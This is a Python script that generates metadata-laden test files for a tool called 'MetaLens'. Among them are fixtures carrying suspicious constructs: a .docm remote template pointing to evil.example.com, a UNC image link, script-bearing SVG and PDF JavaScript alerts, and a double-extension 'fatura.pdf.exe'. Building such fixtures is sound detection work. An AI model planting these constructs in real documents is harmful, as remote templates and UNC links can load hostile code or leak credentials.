#!/usr/bin/env python3
"""MetaLens test verisi üreticisi. Kullanım: python make_fixtures.py <çıktı klasörü>"""
import io, os, struct, subprocess, sys, zipfile, zlib, wave

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)
os.chdir(OUT)


def sh(*a):
    subprocess.run(a, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def exif(path, *tags):
    sh('exiftool', '-q', '-overwrite_original', *tags, path)


# ── resimler ──
sh('magick', '-size', '640x480', 'gradient:red-blue', 'a.jpg')
exif('a.jpg', '-Make=Canon', '-Model=Canon EOS R5', '-Artist=Ali Veli', '-SerialNumber=123456',
     '-LensModel=RF24-105mm F4 L', '-ExposureTime=0.004', '-FNumber=4', '-ISO=200', '-FocalLength=50',
     '-DateTimeOriginal=2024:05:01 14:22:10', '-GPSLatitude=41.0082', '-GPSLatitudeRef=N',
     '-GPSLongitude=28.9784', '-GPSLongitudeRef=E', '-GPSAltitude=39', '-XMP:Creator=Ali Veli',
     '-XMP:CreatorTool=Adobe Photoshop 25.0', '-IPTC:City=Istanbul', '-IPTC:Keywords=deneme',
     '-IPTC:Keywords=test', '-Comment=gizli yorum', '-Orientation#=6')
sh('magick', '-size', '160x120', 'xc:orange', 'thumb.jpg')
exif('a.jpg', '-ThumbnailImage<=thumb.jpg')
with open('a.jpg', 'ab') as f:
    f.write(b'GIZLI-EK-VERI' * 10)  # EOI sonrası veri
sh('magick', '-size', '300x200', 'xc:green', '-set', 'comment', 'hello', 'png:b.png')
exif('b.png', '-PNG:Author=Ayşe', '-XMP:Title=Başlık', '-EXIF:Make=Apple', '-EXIF:GPSLatitude=40',
     '-EXIF:GPSLatitudeRef=S', '-EXIF:GPSLongitude=10', '-EXIF:GPSLongitudeRef=W')
sh('magick', 'a.jpg', 'c.webp'); exif('c.webp', '-tagsfromfile', 'a.jpg', '-all:all')
sh('magick', 'a.jpg', '-compress', 'lzw', 'd.tif'); exif('d.tif', '-tagsfromfile', 'a.jpg', '-exif:all', '-gps:all')
sh('magick', 'a.jpg', '-quality', '60', 'e.avif'); exif('e.avif', '-tagsfromfile', 'a.jpg', '-all:all')
sh('magick', '-size', '50x50', 'xc:blue', '-set', 'comment', 'gif yorumu', 'f.gif')
sh('sips', '-s', 'format', 'heic', 'a.jpg', '--out', 'g.heic'); exif('g.heic', '-tagsfromfile', 'a.jpg', '-all:all')
with open('s.svg', 'w') as f:
    f.write('<?xml version="1.0"?>\n<!-- Generator: Adobe Illustrator 27.0 -->\n'
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" '
            'xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="10" height="10" '
            'sodipodi:docname="gizli.svg" inkscape:export-filename="/Users/ahmet/Desktop/logo.png">'
            '<metadata><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:dc="http://purl.org/dc/elements/1.1/">'
            '<rdf:Description><dc:creator>Ahmet</dc:creator></rdf:Description></rdf:RDF></metadata>'
            '<title>Logo</title><script>alert(1)</script><rect width="10" height="10" onclick="x()"/></svg>')

JPEG = open('a.jpg', 'rb').read()


# ── PDF'ler ──
def build_pdf(objs, trailer, version=b'1.7'):
    out = bytearray(b'%PDF-' + version + b'\n%\xe2\xe3\xcf\xd3\n')
    offs = {}
    for num, body in objs:
        offs[num] = len(out)
        out += b'%d 0 obj\n' % num + body + b'\nendobj\n'
    x = len(out)
    size = max(offs) + 1
    out += b'xref\n0 %d\n0000000000 65535 f \n' % size
    for i in range(1, size):
        out += b'%010d 00000 n \n' % offs.get(i, 0)
    out += b'trailer\n' + trailer.replace(b'SIZE', str(size).encode()) + b'\nstartxref\n%d\n%%%%EOF\n' % x
    return bytes(out)


def stream(dictbody, data):
    return b'<< ' + dictbody + b' /Length %d >>\nstream\n' % len(data) + data + b'\nendstream'


# j.pdf: nesne akışı + sıkıştırılmış XMP + gizlenmiş JS + artımlı güncelleme
xmp = (b'<?xpacket begin="" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF '
       b'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" '
       b'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:xmp="http://ns.adobe.com/xap/1.0/" '
       b'xmlns:pdf="http://ns.adobe.com/pdf/1.3/" xmp:CreatorTool="Microsoft Word 365" pdf:Producer="Acrobat Distiller">'
       b'<dc:creator><rdf:Seq><rdf:li>Zeynep Kaya</rdf:li></rdf:Seq></dc:creator></rdf:Description></rdf:RDF></x:xmpmeta>'
       b'<?xpacket end="w"?>')
inner = {1: b'<< /Type /Catalog /Pages 2 0 R /Metadata 6 0 R /OpenAction 7 0 R /Lang (tr-TR) >>',
         2: b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
         3: b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /ABCDEF+Helvetica >> >> >> >>',
         5: b"<< /Title <FEFF004700FC006E006C00FC006B> /Author (Can \\(test\\) \\351) /Producer (Skia/PDF m120) /CreationDate (D:20240501120000+03'00') /ModDate (D:20240601120000Z) /Custom (x) >>",
         7: b'<< /S /JavaScript /J#53 (app.alert\\(1\\)) >>'}
hdr = b''; body = b''
for n, o in inner.items():
    hdr += b'%d %d ' % (n, len(body)); body += o + b'\n'
comp = zlib.compress(hdr + body)
cx = zlib.compress(xmp)
out = bytearray(b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')
out += b'4 0 obj\n' + stream(b'/Type /ObjStm /N %d /First %d /Filter /FlateDecode' % (len(inner), len(hdr)), comp) + b'\nendobj\n'
out += b'6 0 obj\n<< /Type /Metadata /Subtype /XML /Filter /FlateDecode /Length 8 0 R >>\nstream\n' + cx + b'\nendstream\nendobj\n'
out += b'8 0 obj\n%d\nendobj\n' % len(cx)
p9 = len(out)
out += b'9 0 obj\n<< /Type /XRef /Size 10 /Root 1 0 R /Info 5 0 R /ID [<aabbcc><ddeeff>] /W [1 4 2] >>\nstream\n\nendstream\nendobj\nstartxref\n%d\n%%%%EOF\n' % p9
out += b'10 0 obj\n<< /Foo /Bar >>\nendobj\ntrailer\n<< /Size 11 /Root 1 0 R /Info 5 0 R /Prev 0 >>\nstartxref\n0\n%%EOF\n'
open('j.pdf', 'wb').write(bytes(out))

# k.pdf: gömülü JPEG (EXIF+GPS) + ekli dosya + nesne XMP + düz Info
obj_xmp = xmp.replace(b'Zeynep Kaya', b'Yerlestirilen Resim Sahibi')
kobjs = [
    (1, b'<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles << /Names [(rapor.docx) 7 0 R] >> >> >>'),
    (2, b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>'),
    (3, b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 4 0 R >> >> /Contents 5 0 R >>'),
    (4, stream(b'/Type /XObject /Subtype /Image /Width 640 /Height 480 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Metadata 9 0 R', JPEG)),
    (5, stream(b'', b'q 640 0 0 480 0 0 cm /Im1 Do Q')),
    (6, b'<< /Author (Info Yazari) /Creator (Word) /Producer (macOS Quartz PDFContext) >>'),
    (7, b'<< /Type /Filespec /F (rapor.docx) /UF (rapor.docx) /Desc (Gizli ek) /EF << /F 8 0 R >> >>'),
    (9, stream(b'/Type /Metadata /Subtype /XML', obj_xmp)),
]
docx_placeholder = b'PLACEHOLDER'
open('k_objs.tmp', 'wb').write(b'')

# ── Office ──
def zwrite(path, files, stored_first=None):
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        if stored_first:
            z.writestr(zipfile.ZipInfo(stored_first[0]), stored_first[1], compress_type=zipfile.ZIP_STORED)
        for n, d in files.items():
            z.writestr(n, d)


CT = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
      '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
      '<Default Extension="xml" ContentType="application/xml"/><Default Extension="jpeg" ContentType="image/jpeg"/>'
      '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
CORE = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" '
        'xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
        '<dc:title>Gizli Teklif</dc:title><dc:creator>Mehmet Öz</dc:creator><cp:lastModifiedBy>Ayşe Demir</cp:lastModifiedBy>'
        '<cp:revision>17</cp:revision><cp:lastPrinted>2024-02-01T10:00:00Z</cp:lastPrinted>'
        '<dcterms:created xsi:type="dcterms:W3CDTF">2024-01-01T09:00:00Z</dcterms:created>'
        '<dcterms:modified xsi:type="dcterms:W3CDTF">2024-03-05T18:30:00Z</dcterms:modified></cp:coreProperties>')
APP = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" '
       'xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>\\\\fileserver\\sablonlar\\Teklif.dotm</Template>'
       '<TotalTime>245</TotalTime><Pages>3</Pages><Words>512</Words><Application>Microsoft Office Word</Application>'
       '<AppVersion>16.0000</AppVersion><Company>Acme Savunma A.Ş.</Company><Manager>Genel Müdür</Manager>'
       '<TitlesOfParts><vt:vector size="1" baseType="lpstr"><vt:lpstr>Gizli Teklif</vt:lpstr></vt:vector></TitlesOfParts></Properties>')
CUSTOM = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" '
          'xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">'
          '<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="MSIP_Label_1234_SiteId"><vt:lpwstr>72f988bf-86f1-41af-91ab-2d7cd011db47</vt:lpwstr></property>'
          '<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="ProjeKodu"><vt:lpwstr>X-42</vt:lpwstr></property></Properties>')
DOC = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
       '<w:body><w:p><w:ins w:id="1" w:author="Ayşe Demir" w:date="2024-03-01T10:00:00Z"><w:r><w:t>eklenen</w:t></w:r></w:ins>'
       '<w:del w:id="2" w:author="Hukuk Birimi" w:date="2024-03-04T10:00:00Z"><w:r><w:delText>silinen</w:delText></w:r></w:del>'
       '<w:r><w:rPr><w:vanish/></w:rPr><w:t>gizli metin</w:t></w:r></w:p></w:body></w:document>')
SETTINGS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:attachedTemplate r:id="rId1"/><w:trackRevisions/>'
            '<w:rsids><w:rsidRoot w:val="00A1"/><w:rsid w:val="00A1"/><w:rsid w:val="00B2"/><w:rsid w:val="00C3"/></w:rsids></w:settings>')
SETTINGS_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                 '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                 'Target="http://evil.example.com/tpl.dotm" TargetMode="External"/></Relationships>')
DOC_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/x" TargetMode="External"/>'
            '<Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="file:///\\\\10.0.0.5\\share\\logo.png" TargetMode="External"/>'
            '<Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/></Relationships>')
COMMENTS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:comments xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:comment w:id="0" w:author="Mehmet Öz" w:initials="MÖ"><w:p><w:r><w:t>fiyatı düşür</w:t></w:r></w:p></w:comment></w:comments>')
PEOPLE = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w15:people xmlns:w15="http://schemas.microsoft.com/office/word/2012/wordml">'
          '<w15:person w15:author="Mehmet Öz"><w15:presenceInfo w15:providerId="AD" w15:userId="S::mehmet@acme.com.tr::abcd"/></w15:person></w15:people>')
ROOT_RELS = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
             '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
zwrite('m.docm', {'[Content_Types].xml': CT, '_rels/.rels': ROOT_RELS, 'docProps/core.xml': CORE, 'docProps/app.xml': APP,
                  'docProps/custom.xml': CUSTOM, 'docProps/thumbnail.jpeg': open('thumb.jpg', 'rb').read(),
                  'word/document.xml': DOC, 'word/settings.xml': SETTINGS, 'word/_rels/settings.xml.rels': SETTINGS_RELS,
                  'word/_rels/document.xml.rels': DOC_RELS, 'word/comments.xml': COMMENTS, 'word/people.xml': PEOPLE,
                  'word/media/image1.jpeg': JPEG, 'word/vbaProject.bin': b'\xd0\xcf\x11\xe0fake',
                  'word/embeddings/oleObject1.bin': b'\xd0\xcf\x11\xe0fake'})

XL_CT = CT.replace('word/document.xml', 'xl/workbook.xml').replace('ms-word.document.macroEnabled.main', 'openxmlformats-officedocument.spreadsheetml.sheet.main')
WB = ('<?xml version="1.0" encoding="UTF-8" standalone="yes"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
      'xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac">'
      '<fileVersion appName="xl" lastEdited="7" lowestEdited="7" rupBuild="27425"/>'
      '<mc:AlternateContent><mc:Choice Requires="x15"><x15ac:absPath url="C:\\Users\\mehmet.oz\\OneDrive - Acme\\Maaslar\\" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac"/></mc:Choice></mc:AlternateContent>'
      '<sheets><sheet name="Özet" sheetId="1"/><sheet name="Maaşlar" sheetId="2" state="hidden"/></sheets></workbook>')
XL_COMM = ('<?xml version="1.0"?><comments xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><authors><author>Muhasebe Ali</author></authors></comments>')
XL_CONN = ('<?xml version="1.0"?><connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><connection id="1" name="SQL">'
           '<dbPr connection="Provider=SQLOLEDB;Data Source=db01.acme.local;User ID=sa;Initial Catalog=HR"/></connection></connections>')
zwrite('n.xlsx', {'[Content_Types].xml': XL_CT, 'docProps/core.xml': CORE, 'docProps/app.xml': APP.replace('Microsoft Office Word', 'Microsoft Excel'),
                  'xl/workbook.xml': WB, 'xl/comments1.xml': XL_COMM, 'xl/connections.xml': XL_CONN})

PPT_CT = CT.replace('word/document.xml', 'ppt/presentation.xml').replace('ms-word.document.macroEnabled.main', 'openxmlformats-officedocument.presentationml.presentation.main')
zwrite('o.pptx', {'[Content_Types].xml': PPT_CT, 'docProps/core.xml': CORE, 'ppt/presentation.xml': '<p:presentation/>',
                  'ppt/slides/slide1.xml': '<p:sld/>', 'ppt/slides/slide2.xml': '<p:sld/>', 'ppt/notesSlides/notesSlide1.xml': '<p:notes/>',
                  'ppt/commentAuthors.xml': '<p:cmAuthorLst xmlns:p="x"><p:cmAuthor id="1" name="Sunum Sahibi" initials="SS"/></p:cmAuthorLst>'})

META = ('<?xml version="1.0" encoding="UTF-8"?><office:document-meta xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
        'xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.3">'
        '<office:meta><meta:generator>LibreOffice/7.6.4.1$Linux_X86_64</meta:generator><dc:title>ODT Başlık</dc:title>'
        '<meta:initial-creator>Kemal Yıldız</meta:initial-creator><dc:creator>Selin Ak</dc:creator><meta:creation-date>2023-11-11T11:11:11</meta:creation-date>'
        '<meta:editing-cycles>12</meta:editing-cycles><meta:editing-duration>PT2H30M5S</meta:editing-duration><meta:printed-by>Selin Ak</meta:printed-by>'
        '<meta:template xlink:type="simple" xlink:href="/home/kemal/Templates/rapor.ott" xlink:title="rapor"/>'
        '<meta:document-statistic meta:page-count="4" meta:word-count="900"/><meta:user-defined meta:name="Müşteri">Beta Ltd</meta:user-defined>'
        '</office:meta></office:document-meta>')
zwrite('p.odt', {'meta.xml': META, 'content.xml': '<x/>', 'Pictures/img.jpg': JPEG, 'Basic/Standard/Module1.xml': '<x/>'},
       stored_first=('mimetype', 'application/vnd.oasis.opendocument.text'))

OPF = ('<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/">'
       '<dc:title>Kitap</dc:title><dc:creator>Yazar Adı</dc:creator><dc:publisher>Yayınevi</dc:publisher><meta name="generator" content="Calibre 7"/></metadata></package>')
zwrite('q.epub', {'META-INF/container.xml': '<container><rootfiles><rootfile full-path="OEBPS/content.opf"/></rootfiles></container>',
                  'OEBPS/content.opf': OPF, 'OEBPS/cover.jpg': JPEG}, stored_first=('mimetype', 'application/epub+zip'))
zwrite('r.jar', {'META-INF/MANIFEST.MF': 'Manifest-Version: 1.0\r\nCreated-By: 17.0.2 (Oracle)\r\nBuilt-By: jenkins-ahmet\r\nMain-Class: a.B\r\n', 'a/B.class': b'\xca\xfe'})
zwrite('t.zip', {'belge.pdf': b'%PDF-1.4', 'fatura.pdf.exe': b'MZ', 'foto.jpg': JPEG})
with zipfile.ZipFile('t.zip', 'a') as z:
    z.comment = b'arsiv yorumu'
DOCX_BYTES = open('m.docm', 'rb').read()

# k.pdf'i ek dosya ile tamamla
kobjs.append((8, stream(b'/Type /EmbeddedFile /Subtype /application#2Fvnd.openxmlformats-officedocument.wordprocessingml.document /Params << /Size %d /CreationDate (D:20240102030405Z) >>' % len(DOCX_BYTES), DOCX_BYTES)))
kobjs.sort()
open('k.pdf', 'wb').write(build_pdf(kobjs, b'<< /Size SIZE /Root 1 0 R /Info 6 0 R /ID [<0102><0102>] >>'))
os.remove('k_objs.tmp')

# eski DOC (textutil)
with open('t.html', 'w') as f:
    f.write('<html><head><meta name="author" content="Eski Yazar"><meta name="title" content="Eski Belge"><meta name="company" content="Eski Şirket"></head><body><p>Merhaba</p></body></html>')
sh('textutil', '-convert', 'doc', 't.html', '-output', 'u.doc')
sh('textutil', '-convert', 'docx', 't.html', '-output', 'u.docx')

# ── ses/video ──
with wave.open('w0.wav', 'wb') as w:
    w.setnchannels(2); w.setsampwidth(2); w.setframerate(44100); w.writeframes(b'\0\0' * 2 * 44100 * 2)
raw = open('w0.wav', 'rb').read()
fmt_end = raw.index(b'data')
info = b''
for k, v in [(b'INAM', 'Kayıt Başlığı'), (b'IART', 'Kayıt Sanatçısı'), (b'ISFT', 'Adobe Audition 24'), (b'ICRD', '2024-06-01')]:
    d = v.encode() + b'\0'
    info += k + struct.pack('<I', len(d)) + d + (b'\0' if len(d) % 2 else b'')
info = b'LIST' + struct.pack('<I', len(info) + 4) + b'INFO' + info
bext = bytearray(602)
bext[0:12] = b'Muhabir notu'; bext[256:266] = b'ZOOM H6 #7'; bext[320:330] = b'2024-06-01'; bext[330:338] = b'10:20:30'
bext = b'bext' + struct.pack('<I', len(bext)) + bytes(bext)
wav = raw[:fmt_end] + info + bext + raw[fmt_end:]
wav = wav[:4] + struct.pack('<I', len(wav) - 8) + wav[8:]
open('v.wav', 'wb').write(wav)

sh('afconvert', '-f', 'm4af', '-d', 'aac', 'w0.wav', 'x.m4a')
exif('x.m4a', '-ItemList:Title=Podcast Bölüm 1', '-ItemList:Artist=Sunucu Adı', '-ItemList:Encoder=Lavf60',
     '-UserData:GPSCoordinates=39.9208, 32.8541, 850', '-ItemList:CoverArt<=thumb.jpg')
sh('afconvert', '-f', 'flac', '-d', 'flac', 'w0.wav', 'y0.flac')
fl = open('y0.flac', 'rb').read()
p = 4; blocks = []
while True:
    h = fl[p]; size = int.from_bytes(fl[p + 1:p + 4], 'big')
    blocks.append([h & 0x7f, fl[p + 4:p + 4 + size]]); p += 4 + size
    if h & 0x80: break
vendor = b'reference libFLAC 1.4.3'
comments = [b'TITLE=FLAC Parca', b'ARTIST=FLAC Sanatci', b'ENCODED_BY=Ahmet Bilgisayar', b'LOCATION=Izmir']
vc = struct.pack('<I', len(vendor)) + vendor + struct.pack('<I', len(comments)) + b''.join(struct.pack('<I', len(c)) + c for c in comments)
blocks = [b for b in blocks if b[0] not in (4, 1)] + [[4, vc]]
flac = bytearray(b'fLaC')
for i, (t, d) in enumerate(blocks):
    flac += bytes([t | (0x80 if i == len(blocks) - 1 else 0)]) + len(d).to_bytes(3, 'big') + d
flac += fl[p:]
open('y.flac', 'wb').write(bytes(flac))

# MP3: ID3v2.3 + MPEG1 L3 128k çerçeveleri + ID3v1
def id3frame(fid, data):
    return fid + struct.pack('>I', len(data)) + b'\0\0' + data
def t3(s):  # UTF-16 BOM
    return b'\x01' + s.encode('utf-16')
frames = (id3frame(b'TIT2', t3('Şarkı Adı')) + id3frame(b'TPE1', t3('Şarkıcı')) + id3frame(b'TENC', t3('iTunes 12.1')) +
          id3frame(b'TSSE', b'\x00LAME 3.100') + id3frame(b'COMM', b'\x00eng\x00Gizli yorum burada') +
          id3frame(b'TXXX', b'\x00Kaydeden\x00Studyo 5') + id3frame(b'PRIV', b'www.amazon.com\x00\x01\x02') +
          id3frame(b'APIC', b'\x00image/jpeg\x00\x03kapak\x00' + JPEG))
sz = len(frames)
ss = bytes([(sz >> 21) & 127, (sz >> 14) & 127, (sz >> 7) & 127, sz & 127])
mpeg = (b'\xff\xfb\x90\x64' + b'\0' * 413) * 200
v1 = b'TAG' + b'V1 Baslik'.ljust(30, b'\0') + b'V1 Sanatci'.ljust(30, b'\0') + b'V1 Album'.ljust(30, b'\0') + b'2020' + b'v1 yorum'.ljust(28, b'\0') + b'\0\x05' + b'\x0c'
open('z.mp3', 'wb').write(b'ID3\x03\x00\x00' + ss + frames + mpeg + v1)

# OGG Opus (CRC'li)
def ogg_crc(data):
    crc = 0
    for b in data:
        crc ^= b << 24
        for _ in range(8):
            crc = ((crc << 1) ^ 0x04c11db7) & 0xffffffff if crc & 0x80000000 else (crc << 1) & 0xffffffff
    return crc
def ogg_page(seq, granule, data, flags=0):
    segs = []
    n = len(data)
    while n >= 255: segs.append(255); n -= 255
    segs.append(n)
    hdr = b'OggS\x00' + bytes([flags]) + struct.pack('<qII', granule, 0x1234, seq) + b'\0\0\0\0' + bytes([len(segs)]) + bytes(segs)
    page = bytearray(hdr + data)
    page[22:26] = struct.pack('<I', ogg_crc(page))
    return bytes(page)
opushead = b'OpusHead\x01\x02' + struct.pack('<HIhB', 312, 48000, 0, 0)
tags = [b'TITLE=Opus Kaydi', b'ARTIST=Opus Kisi', b'ENCODER=opusenc from opus-tools 0.2']
opustags = b'OpusTags' + struct.pack('<I', 9) + b'libopus x' + struct.pack('<I', len(tags)) + b''.join(struct.pack('<I', len(t)) + t for t in tags)
ogg = ogg_page(0, 0, opushead, 2) + ogg_page(1, 0, opustags) + ogg_page(2, 48000 * 125 + 312, b'\xfc' * 20, 4)
open('za.opus', 'wb').write(ogg)

# MKV (EBML)
def vint_size(n):
    for l in range(1, 9):
        if n < (1 << (7 * l)) - 1:
            return ((1 << (7 * l)) | n).to_bytes(l, 'big')
def el(eid, data):
    return eid + vint_size(len(data)) + data
def uint(n):
    return n.to_bytes(max(1, (n.bit_length() + 7) // 8), 'big')
ebml = el(b'\x1a\x45\xdf\xa3', el(b'\x42\x86', b'\x01') + el(b'\x42\x82', b'matroska'))
dateutc = (1704067200 - 978307200) * 10**9  # 2024-01-01
info = el(b'\x15\x49\xa9\x66', el(b'\x2a\xd7\xb1', uint(1000000)) + el(b'\x44\x89', struct.pack('>d', 93500.0)) +
          el(b'\x44\x61', struct.pack('>q', dateutc)) + el(b'\x7b\xa9', 'MKV Başlık'.encode()) +
          el(b'\x4d\x80', b'libebml v1.4.4 + libmatroska v1.7.1') + el(b'\x57\x41', b'HandBrake 1.7.2'))
tracks = el(b'\x16\x54\xae\x6b', el(b'\xae', el(b'\xd7', b'\x01') + el(b'\x83', b'\x01') + el(b'\x86', b'V_MPEG4/ISO/AVC') +
            el(b'\xe0', el(b'\xb0', uint(1920)) + el(b'\xba', uint(1080)))) +
            el(b'\xae', el(b'\xd7', b'\x02') + el(b'\x83', b'\x02') + el(b'\x86', b'A_AAC') + el(b'\x22\xb5\x9c', b'tur') +
            el(b'\xe1', el(b'\xb5', struct.pack('>f', 48000.0)) + el(b'\x9f', b'\x02'))))
tagsel = el(b'\x12\x54\xc3\x67', el(b'\x73\x73', el(b'\x67\xc8', el(b'\x45\xa3', b'ENCODER') + el(b'\x44\x87', b'Lavf60.3.100')) +
            el(b'\x67\xc8', el(b'\x45\xa3', b'COMMENT') + el(b'\x44\x87', 'Çekim yeri Bursa'.encode()))))
attach = el(b'\x19\x41\xa4\x69', el(b'\x61\xa7', el(b'\x46\x6e', b'font.ttf') + el(b'\x46\x60', b'font/ttf') + el(b'\x46\x5c', b'\0' * 10)))
cluster = el(b'\x1f\x43\xb6\x75', b'\xe7\x81\x00' + b'\0' * 100)
seg = el(b'\x18\x53\x80\x67', info + tracks + cluster + tagsel + attach)
open('zb.mkv', 'wb').write(ebml + seg)

# AVI
def chunk(cid, data):
    return cid + struct.pack('<I', len(data)) + data + (b'\0' if len(data) % 2 else b'')
def lst(ltype, data):
    return b'LIST' + struct.pack('<I', len(data) + 4) + ltype + data
avih = struct.pack('<IIIIIIIIII', 33333, 0, 0, 0x10, 300, 0, 1, 0, 640, 480) + b'\0' * 16
strh = b'vidsMJPG' + b'\0' * 48
avi_body = b'AVI ' + lst(b'hdrl', chunk(b'avih', avih) + lst(b'strl', chunk(b'strh', strh))) + \
    lst(b'INFO', chunk(b'ISFT', b'CanonMVI06\0') + chunk(b'IDIT', b'SAT JUN 01 10:20:30 2024\n\0')) + lst(b'movi', b'')
open('zc.avi', 'wb').write(b'RIFF' + struct.pack('<I', len(avi_body)) + avi_body)

# MP4 video (elle): ftyp + moov(mvhd, trak(tkhd,mdia(mdhd,hdlr,minf(stbl(stsd)))), udta(©xyz), meta(keys/ilst)) + mdat
def box(t, d):
    return struct.pack('>I', 8 + len(d)) + t + d
ct = 3786912000 + 2082844800 - 2082844800  # 2024-01-01 → mac epoch saniye
mac = 1704067200 + 2082844800
mvhd = box(b'mvhd', b'\0\0\0\0' + struct.pack('>IIII', mac, mac + 60, 600, 600 * 42) + b'\x00\x01\x00\x00\x01\x00' + b'\0' * 10 + b'\0' * 36 + b'\0' * 24 + struct.pack('>I', 2))
tkhd = box(b'tkhd', b'\0\0\0\x01' + struct.pack('>IIIII', mac, mac, 1, 0, 600 * 42) + b'\0' * 8 + b'\0' * 8 + b'\0' * 36 + struct.pack('>II', 1920 << 16, 1080 << 16))
mdhd = box(b'mdhd', b'\0\0\0\0' + struct.pack('>IIII', mac, mac, 30000, 30000 * 42) + struct.pack('>HH', 0x55c4, 0))
hdlr = box(b'hdlr', b'\0\0\0\0' + b'\0\0\0\0' + b'vide' + b'\0' * 12 + b'Core Media Video\0')
avc1 = b'\0' * 6 + b'\0\x01' + b'\0' * 16 + struct.pack('>HH', 1920, 1080) + b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\0' * 4 + b'\0\x01' + bytes([4]) + b'H264'.ljust(31, b'\0') + b'\0\x18\xff\xff'
stsd = box(b'stsd', b'\0\0\0\0' + struct.pack('>I', 1) + box(b'avc1', avc1))
trak = box(b'trak', tkhd + box(b'mdia', mdhd + hdlr + box(b'minf', box(b'stbl', stsd))))
xyz = '+41.0151+028.9795+012.000/'.encode()
udta = box(b'udta', box(b'\xa9xyz', struct.pack('>HH', len(xyz), 0x15c7) + xyz) + box(b'\xa9swr', struct.pack('>HH', 12, 0) + b'iOS 17.4.1  '))
keys = [b'com.apple.quicktime.make', b'com.apple.quicktime.model', b'com.apple.quicktime.location.ISO6709', b'com.apple.quicktime.creationdate']
vals = [b'Apple', b'iPhone 15 Pro', b'+41.0151+028.9795+012.000/', b'2024-01-01T12:00:00+0300']
keysbox = box(b'keys', b'\0\0\0\0' + struct.pack('>I', len(keys)) + b''.join(struct.pack('>I', 8 + len(k)) + b'mdta' + k for k in keys))
ilst = box(b'ilst', b''.join(struct.pack('>I', 8 + 8 + 8 + len(v)) + struct.pack('>I', i + 1) + box(b'data', struct.pack('>II', 1, 0) + v) for i, v in enumerate(vals)))
